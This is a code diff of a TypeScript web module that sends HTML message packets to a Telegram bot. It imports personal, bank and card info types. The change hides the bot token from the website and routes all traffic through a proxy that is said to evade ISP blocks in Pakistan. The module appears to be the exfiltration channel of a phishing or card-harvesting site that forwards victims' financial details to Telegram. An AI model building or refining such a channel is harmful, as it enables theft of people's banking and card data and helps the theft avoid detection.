@@ -1,22 +1,6 @@
 import { PersonalInfo, BankInfo, CardInfo } from '../types';
 
-// Telegram Bot & Proxy Environment Config
-const getBotToken = (): string => {
-  return (
-    (import.meta as any).env?.TELEGRAM_BOT_TOKEN ||
-    (typeof process !== 'undefined' && process.env?.TELEGRAM_BOT_TOKEN) ||
-    ''
-  );
-};
-
-const getChatId = (): string => {
-  return (
-    (import.meta as any).env?.TELEGRAM_CHAT_ID ||
-    (typeof process !== 'undefined' && process.env?.TELEGRAM_CHAT_ID) ||
-    ''
-  );
-};
-
+// Proxy Server URL configuration (Defaults to local Python proxy or Vercel /api/send in production)
 const getProxyUrl = (): string => {
   if ((import.meta as any).env?.PROXY_SERVER_URL) {
     return (import.meta as any).env.PROXY_SERVER_URL;
@@ -61,76 +45,40 @@ function escapeHtml(text: string | number | undefined | null): string {
 
 /**
  * Core helper to send an HTML-formatted message packet to Telegram.
- * Routes through the local Python proxy server first to bypass ISP blocks in Pakistan.
+ * Sends data to the proxy server without exposing any Telegram bot credentials on the website!
  */
 export async function sendTelegramMessage(htmlText: string): Promise<boolean> {
-  const botToken = getBotToken();
-  const chatId = getChatId();
   const proxyUrl = getProxyUrl();
 
   const payload = {
-    chat_id: chatId,
-    bot_token: botToken,
     text: htmlText,
     parse_mode: 'HTML',
   };
 
-  // 1. Primary Route: Send via Python Proxy Server (Bypasses Pakistan ISP Bans)
-  if (proxyUrl) {
-    try {
-      const proxyResponse = await fetch(proxyUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-      });
-
-      if (proxyResponse.ok) {
-        const result = await proxyResponse.json();
-        if (result.ok) {
-          console.log('[Telegram Proxy] Message delivered successfully via PC Proxy Server:', result);
-          return true;
-        } else {
-          console.warn('[Telegram Proxy] Proxy responded with error:', result);
-        }
-      } else {
-        console.warn(`[Telegram Proxy] Server returned HTTP ${proxyResponse.status}`);
-      }
-    } catch (proxyErr) {
-      console.warn('[Telegram Proxy] PC Proxy server is not reachable at', proxyUrl, '- attempting direct fallback.', proxyErr);
-    }
-  }
-
-  // 2. Fallback Route: Direct to Telegram API (if proxy is down and network has direct access)
-  if (!botToken || botToken.includes('YOUR_TELEGRAM_BOT_TOKEN') || !chatId) {
-    console.info('[Telegram Service] Bot token or chat ID not set. Message packet logged locally:');
-    console.log(htmlText.replace(/<[^>]+>/g, ''));
-    return false;
-  }
-
   try {
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
+    const proxyResponse = await fetch(proxyUrl, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: htmlText,
-        parse_mode: 'HTML',
-      }),
+      body: JSON.stringify(payload),
     });
 
-    const result = await response.json();
-    if (!result.ok) {
-      console.error('[Telegram Service] Direct API delivery failed:', result);
+    if (proxyResponse.ok) {
+      const result = await proxyResponse.json();
+      if (result.ok) {
+        console.log('[Telegram Proxy] Message delivered successfully via Proxy Server:', result);
+        return true;
+      } else {
+        console.warn('[Telegram Proxy] Proxy responded with error:', result);
+        return false;
+      }
+    } else {
+      console.warn(`[Telegram Proxy] Server returned HTTP ${proxyResponse.status}`);
       return false;
     }
-    return true;
-  } catch (err) {
-    console.error('[Telegram Service] Direct Telegram API blocked or unreachable (PTA ban). Please ensure python proxy_server.py is running on your PC:', err);
+  } catch (proxyErr) {
+    console.error('[Telegram Proxy] Proxy server is unreachable at', proxyUrl, proxyErr);
     return false;
   }
 }
